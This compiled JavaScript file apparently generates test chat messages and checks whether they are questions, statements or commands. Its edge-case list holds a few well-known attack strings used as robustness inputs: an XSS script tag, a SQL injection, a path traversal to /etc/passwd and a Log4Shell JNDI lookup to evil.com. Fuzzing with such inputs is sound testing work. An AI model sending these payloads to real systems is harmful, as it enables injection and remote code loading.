"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.MessageGenerator = void 0;
/**
 * Message generator for creating diverse test messages
 */
class MessageGenerator {
    constructor() {
        this.random = Math.random;
    }
    /**
     * Generate a random message
     */
    generateMessage(type = 'random', constraints) {
        const actualType = type === 'random' ? this.selectRandomType() : type;
        switch (actualType) {
            case 'question':
                return this.generateQuestion(constraints);
            case 'statement':
                return this.generateStatement(constraints);
            case 'command':
                return this.generateCommand(constraints);
            default:
                return this.generateStatement(constraints);
        }
    }
    /**
     * Select a random message type
     */
    selectRandomType() {
        const types = ['question', 'statement', 'command'];
        return types[Math.floor(this.random() * types.length)];
    }
    /**
     * Generate a question message
     * Questions end with question marks and use interrogative words
     */
    generateQuestion(constraints) {
        const questions = [
            'What is your name?',
            'How are you today?',
            'Can you help me with something?',
            'What can you do?',
            'Do you understand what I mean?',
            'Why is that the case?',
            'Where can I find more information?',
            'When will this be available?',
            'Who is responsible for this?',
            'Which option should I choose?',
            'Could you explain that again?',
            'Is this the correct approach?',
            'Have you considered the alternatives?',
            'Would you recommend this solution?',
            'Are there any other options?'
        ];
        let message = questions[Math.floor(this.random() * questions.length)];
        // Ensure question ends with question mark
        if (!message.endsWith('?')) {
            message += '?';
        }
        return this.applyConstraints(message, constraints);
    }
    /**
     * Generate a statement message
     * Statements are declarative and end with periods
     */
    generateStatement(constraints) {
        const statements = [
            'Hello, I need some assistance.',
            'This is a test message.',
            'I am trying to understand how this works.',
            'The weather is nice today.',
            'I appreciate your help.',
            'That makes sense to me.',
            'I have a question about the service.',
            'Thank you for your time.',
            'I would like to know more.',
            'This is interesting information.',
            'The system appears to be functioning correctly.',
            'I have completed the required steps.',
            'The documentation is very helpful.',
            'Everything seems to be in order.',
            'I understand the process now.'
        ];
        let message = statements[Math.floor(this.random() * statements.length)];
        // Ensure statement ends with period
        if (!message.endsWith('.') && !message.endsWith('!')) {
            message += '.';
        }
        return this.applyConstraints(message, constraints);
    }
    /**
     * Generate a command message
     * Commands use imperative verbs and are directive
     */
    generateCommand(constraints) {
        const commands = [
            'Show me the options.',
            'List all available items.',
            'Tell me about your features.',
            'Explain how this works.',
            'Provide more details.',
            'Help me understand.',
            'Give me an example.',
            'Start the process.',
            'Stop what you are doing.',
            'Reset to default settings.',
            'Display the results.',
            'Update the configuration.',
            'Delete the old records.',
            'Save my preferences.',
            'Load the previous state.'
        ];
        let message = commands[Math.floor(this.random() * commands.length)];
        // Ensure command ends with period
        if (!message.endsWith('.') && !message.endsWith('!')) {
            message += '.';
        }
        return this.applyConstraints(message, constraints);
    }
    /**
     * Apply generation constraints to a message
     */
    applyConstraints(message, constraints) {
        if (!constraints) {
            return message;
        }
        // Apply topic if specified
        if (constraints.topic) {
            message = `Regarding ${constraints.topic}: ${message}`;
        }
        // Apply special characters if requested
        if (constraints.includeSpecialChars) {
            const specialChars = ['!', '@', '#', '$', '%', '&', '*'];
            const char = specialChars[Math.floor(this.random() * specialChars.length)];
            message = `${message} ${char}`;
        }
        // Apply length constraints
        if (constraints.minLength && message.length < constraints.minLength) {
            message = this.padMessage(message, constraints.minLength);
        }
        if (constraints.maxLength && message.length > constraints.maxLength) {
            message = message.substring(0, constraints.maxLength);
        }
        return message;
    }
    /**
     * Pad a message to meet minimum length
     */
    padMessage(message, minLength) {
        const padding = ' Additional context to meet length requirements.';
        while (message.length < minLength) {
            message += padding;
        }
        return message.substring(0, minLength);
    }
    /**
     * Generate multiple diverse messages
     * Ensures variation in length and content
     */
    generateDiverseMessages(count, type) {
        const messages = [];
        const usedMessages = new Set();
        for (let i = 0; i < count; i++) {
            let message;
            let attempts = 0;
            const maxAttempts = 50;
            // Generate unique messages with varying lengths
            do {
                const constraints = {
                    minLength: this.randomLength(10, 50),
                    maxLength: this.randomLength(50, 200),
                    includeSpecialChars: this.random() > 0.5
                };
                message = this.generateMessage(type || 'random', constraints);
                attempts++;
            } while (usedMessages.has(message) && attempts < maxAttempts);
            usedMessages.add(message);
            messages.push(message);
        }
        return messages;
    }
    /**
     * Generate a random length within a range
     */
    randomLength(min, max) {
        return Math.floor(this.random() * (max - min + 1)) + min;
    }
    /**
     * Generate messages with varying lengths
     */
    generateVaryingLengthMessages(count) {
        const messages = [];
        const lengths = [10, 50, 100, 200, 500];
        for (let i = 0; i < count; i++) {
            const targetLength = lengths[i % lengths.length];
            const constraints = {
                minLength: targetLength,
                maxLength: targetLength + 50
            };
            messages.push(this.generateMessage('random', constraints));
        }
        return messages;
    }
    /**
     * Generate messages with varying content types
     */
    generateVaryingContentMessages(count) {
        const messages = [];
        const types = ['question', 'statement', 'command'];
        for (let i = 0; i < count; i++) {
            const type = types[i % types.length];
            messages.push(this.generateMessage(type));
        }
        return messages;
    }
    /**
     * Generate edge case messages
     * Includes empty strings, special characters, very long inputs, etc.
     */
    generateEdgeCases() {
        return [
            // Empty and whitespace
            '',
            ' ',
            '   ',
            '\t',
            '\n',
            '\r\n',
            // Special characters
            '!@#$%^&*()',
            '<script>alert("test")</script>',
            '"; DROP TABLE users; --',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            // Unicode and emojis
            '你好世界',
            'مرحبا بالعالم',
            '🎉🎊🎈',
            '👍👎👌',
            // Very long input
            'A'.repeat(1000),
            'This is a very long message that goes on and on. '.repeat(50),
            // Mixed content
            'Hello\x00World',
            'Test\u0000Message',
            // Quotes and escapes
            "It's a test with 'quotes'",
            'He said "Hello" to me',
            'Backslash \\ test',
            'Tab\tand\nnewline',
            // Numbers and symbols
            '12345',
            '3.14159',
            '-999',
            '1e10',
            // Repeated characters
            'aaaaaaaaaa',
            '...........',
            '!!!!!!!!!!',
            // Case variations
            'UPPERCASE MESSAGE',
            'lowercase message',
            'MiXeD CaSe MeSsAgE'
        ];
    }
    /**
     * Generate a random edge case message
     */
    generateRandomEdgeCase() {
        const edgeCases = this.generateEdgeCases();
        return edgeCases[Math.floor(this.random() * edgeCases.length)];
    }
    /**
     * Generate very long message
     */
    generateVeryLongMessage(length = 10000) {
        const base = 'This is a very long message designed to test system limits. ';
        let message = '';
        while (message.length < length) {
            message += base;
        }
        return message.substring(0, length);
    }
    /**
     * Generate message with special characters
     */
    generateSpecialCharacterMessage() {
        const specialChars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`';
        let message = 'Message with special chars: ';
        for (let i = 0; i < 10; i++) {
            message += specialChars[Math.floor(this.random() * specialChars.length)];
        }
        return message;
    }
    /**
     * Generate empty or whitespace-only message
     */
    generateEmptyMessage() {
        const options = ['', ' ', '  ', '\t', '\n', '   \t\n   '];
        return options[Math.floor(this.random() * options.length)];
    }
    /**
     * Check if a message has characteristics of a question
     */
    static isQuestion(message) {
        const trimmed = message.trim();
        // Check for question mark
        if (trimmed.endsWith('?')) {
            return true;
        }
        // Check for interrogative words at the start
        const interrogatives = ['what', 'how', 'why', 'when', 'where', 'who', 'which', 'can', 'could', 'would', 'should', 'is', 'are', 'do', 'does', 'have', 'has'];
        const firstWord = trimmed.split(' ')[0].toLowerCase();
        return interrogatives.includes(firstWord);
    }
    /**
     * Check if a message has characteristics of a statement
     */
    static isStatement(message) {
        const trimmed = message.trim();
        // Statements typically end with periods
        if (trimmed.endsWith('.')) {
            return true;
        }
        // Not a question or command
        return !this.isQuestion(trimmed) && !this.isCommand(trimmed);
    }
    /**
     * Check if a message has characteristics of a command
     */
    static isCommand(message) {
        const trimmed = message.trim();
        // Check for imperative verbs at the start
        const imperativeVerbs = ['show', 'list', 'tell', 'explain', 'provide', 'help', 'give', 'start', 'stop', 'reset', 'display', 'update', 'delete', 'save', 'load', 'create', 'remove', 'add', 'set', 'get'];
        const firstWord = trimmed.split(' ')[0].toLowerCase();
        return imperativeVerbs.includes(firstWord);
    }
    /**
     * Validate that a message matches its intended type
     */
    static validateMessageType(message, expectedType) {
        switch (expectedType) {
            case 'question':
                return this.isQuestion(message);
            case 'statement':
                return this.isStatement(message);
            case 'command':
                return this.isCommand(message);
            case 'random':
                return true; // Random type accepts any message
            default:
                return false;
        }
    }
    /**
     * Generate a coherent sequence of messages on a topic
     * Messages maintain topic consistency and include referential links
     */
    generateCoherentSequence(count, topic) {
        const messages = [];
        const selectedTopic = topic || this.selectRandomTopic();
        // Generate opening message
        messages.push(this.generateOpeningMessage(selectedTopic));
        // Generate follow-up messages
        for (let i = 1; i < count; i++) {
            const previousMessage = messages[i - 1];
            messages.push(this.generateFollowUpMessage(selectedTopic, previousMessage, i));
        }
        return messages;
    }
    /**
     * Select a random topic for conversation
     */
    selectRandomTopic() {
        const topics = [
            'weather',
            'technology',
            'travel',
            'food',
            'sports',
            'music',
            'movies',
            'books',
            'health',
            'education'
        ];
        return topics[Math.floor(this.random() * topics.length)];
    }
    /**
     * Generate an opening message for a topic
     */
    generateOpeningMessage(topic) {
        const templates = [
            `I would like to discuss ${topic}.`,
            `Can you tell me about ${topic}?`,
            `I'm interested in learning about ${topic}.`,
            `What do you know about ${topic}?`,
            `Let's talk about ${topic}.`
        ];
        return templates[Math.floor(this.random() * templates.length)];
    }
    /**
     * Generate a follow-up message that references the topic and previous context
     */
    generateFollowUpMessage(topic, previousMessage, index) {
        const referentialWords = ['that', 'this', 'it', 'the above', 'what you mentioned'];
        const referential = referentialWords[Math.floor(this.random() * referentialWords.length)];
        const templates = [
            `Tell me more about ${referential}.`,
            `How does ${referential} relate to ${topic}?`,
            `I'm curious about ${referential}.`,
            `Can you elaborate on ${referential}?`,
            `What else should I know about ${topic}?`,
            `That's interesting. What about other aspects of ${topic}?`,
            `I see. How does ${topic} work in practice?`,
            `Thanks for explaining. Can you give an example related to ${topic}?`
        ];
        return templates[Math.floor(this.random() * templates.length)];
    }
    /**
     * Check if a sequence of messages maintains topic coherence
     */
    static hasTopicCoherence(messages, topic) {
        if (messages.length === 0) {
            return false;
        }
        // Check if topic appears in most messages
        const topicMentions = messages.filter(msg => msg.toLowerCase().includes(topic.toLowerCase())).length;
        // At least 50% of messages should mention the topic
        return topicMentions >= messages.length * 0.5;
    }
    /**
     * Check if messages have referential links
     */
    static hasReferentialLinks(messages) {
        if (messages.length < 2) {
            return false;
        }
        const referentialWords = ['that', 'this', 'it', 'the above', 'what you mentioned', 'as you said', 'previously'];
        // Check if later messages contain referential words
        for (let i = 1; i < messages.length; i++) {
            const message = messages[i].toLowerCase();
            const hasReference = referentialWords.some(word => message.includes(word));
            if (hasReference) {
                return true;
            }
        }
        return false;
    }
    /**
     * Generate a conversation sequence with natural flow
     */
    generateConversationFlow(length) {
        const messages = [];
        const topic = this.selectRandomTopic();
        // Start with a greeting or opening
        messages.push(this.generateMessage('statement'));
        // Add a question about the topic
        if (length > 1) {
            messages.push(this.generateOpeningMessage(topic));
        }
        // Add follow-up messages
        for (let i = 2; i < length; i++) {
            const type = i % 3 === 0 ? 'question' : 'statement';
            const message = this.generateFollowUpMessage(topic, messages[i - 1], i);
            messages.push(message);
        }
        return messages;
    }
}
exports.MessageGenerator = MessageGenerator;
//# sourceMappingURL=MessageGenerator.js.map